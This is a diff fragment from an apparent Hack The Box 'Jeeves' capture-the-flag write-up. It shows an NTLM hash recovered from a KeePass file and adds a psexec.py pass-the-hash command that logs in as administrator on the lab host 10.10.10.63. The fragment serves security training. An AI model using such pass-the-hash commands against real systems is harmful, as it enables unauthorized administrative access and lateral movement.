@@ -56,4 +56,12 @@ Then use KEEPASS2 TO unlock the file from there get the hashes
 
 aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 
+Feel the thunder and here's my bolt 
+
+python psexec.py --hashes "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" administrator@10.10.10.63
+
+![Jeeves_root](https://user-images.githubusercontent.com/55708909/91628409-1b1ab200-e9dd-11ea-8a0c-cb4364ec1f99.png)
+
+
+
 
